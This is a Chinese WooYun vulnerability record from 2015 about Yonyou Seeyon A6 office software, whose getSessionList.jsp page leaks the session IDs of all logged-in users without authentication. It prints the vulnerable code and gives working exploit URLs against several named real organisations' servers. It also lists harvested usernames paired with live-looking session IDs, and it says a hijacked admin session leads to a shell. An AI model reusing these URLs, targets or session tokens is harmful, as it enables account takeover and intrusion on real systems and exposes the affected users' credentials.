{"id": 36174, "wybug_id": "wooyun-2015-0102452", "wybug_title": "用友致远A6协同管理高危漏洞二", "wybug_corp": "用友软件", "wybug_author": "路人甲", "wybug_date": "2015-03-20 16:30", "wybug_open_date": "2015-06-23 16:32", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-25：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-23：\t细节向公众公开  简要描述： 用友致远A6协同管理高危漏洞二 详细说明：  该漏洞泄露了当前登录用户（所有登录的）的SessionID;利用泄露的SessionID即可登录该用户，包括管理员，进入后getshell毫无压力/yyoa/ext/https/getSessionList.jsp部分代码\n<%@ page contentType=\"text/html;charset=GBK\"%><%@ page session= \"false\" %><%@ page import=\"net.btdz.oa.ext.https.*\"%><%\tString reqType = request.getParameter(\"cmd\");\tString outXML = \"\";\tboolean allowHttps = true;\tif(\"allowHttps\".equalsIgnoreCase(reqType)){\t\t//add code to judge whether it allow https or not\t\tallowHttps = FetchSessionList.checkHttps();\t\tif (allowHttps) response.setHeader(\"AllowHttps\",\"1\");\t}\tif(\"getAll\".equalsIgnoreCase(reqType)){\t\toutXML = FetchSessionList.getXMLAll();\t}\telse if(\"getSingle\".equalsIgnoreCase(reqType)){\t\tString sessionId = request.getParameter(\"ssid\");\t\tif(sessionId != null){\t\t\toutXML = FetchSessionList.getXMLBySessionId(sessionId);\t\t}\t}\telse{\t\toutXML += \"<?xml version=\\\"1.0\\\" encoding=\\\"GB2312\\\"?>\\r\\n\";\t\toutXML += \"<SessionList>\\r\\n\";//\t\toutXML += \"<Session>\\r\\n\";//\t\toutXML += \"</Session>\\r\\n\";\t\toutXML += \"</SessionList>\\r\\n\";\t}\tout.println(outXML);%>\n从上面的代码可知，当cmd参数为getAll时，便可获取到所有用户的SessionID例如：http://www.ssepec.net/yyoa/ext/https/getSessionList.jsp?cmd=getAll\nweiph 9EA4F8832FA1C9BA99E3D13E2F01CAF7zhaozy F9244E7F1B8C39BB8919FAE8E19ED16A\nhttp://oa.wnq.com.cn/yyoa/ext/https/getSessionList.jsp?cmd=getAll\nhuangsc 0088D0C9F166AD9E5C4907908B97CF2Bjiangyl 1057A63B52E4D78CA92B989149D1AC37lisy 1586E35E947B4EF4C92AD27B8D1C279Bzhongjh 1AE537BD94C0286CE5FFE0509B4AB6D0//...\nhttp://oa.lzmc.edu.cn/yyoa/ext/https/getSessionList.jsp?cmd=getAll\nyanyongrong 372BE72272E0C6ABB3A5815AACAD5AB8wujianbo 5D33C475E451E080C074DD741F46470B wangluolijin 64CCB1F31B206ADA1716A8A0252137EAtianqinghua 78C93A5F4CEA64E34B654E8FEE470A1E lidalong 84037EF6F41432DE9EE907C94F7B091B liujianjun 98745C840A8BE288D91C50BB8D1F6A54\n案例：http://oa.lzmc.edu.cn/yyoa/ext/https/getSessionList.jsp?cmd=getAllhttp://www.ssepec.net/yyoa/ext/https/getSessionList.jsp?cmd=getAllhttp://oa.wnq.com.cn/yyoa/ext/https/getSessionList.jsp?cmd=getAllhttp://60.31.196.2/yyoa/ext/https/getSessionList.jsp?cmd=getAllhttp://110.167.194.10:8081/yyoa/ext/https/getSessionList.jsp?cmd=getAll   漏洞证明：  利用获取到的sessionid，成功登录用户。\n\n   修复方案：  不知道这个文件拿来干嘛的   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-23 16:32 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-01 18:43 |    \t\tAwe \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 爱好广泛)\t\t \n  小板凳等着    \n     2015-06-02 09:41 |    \t\tTT向上 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | 慢慢逗你玩)\t\t \n  都忽略了 求公开啊    \n     2015-07-28 20:24 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:25        | 不会挖洞洞的猿猿不是好学生)\t\t \n  怎么用sessionid登陆啊    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}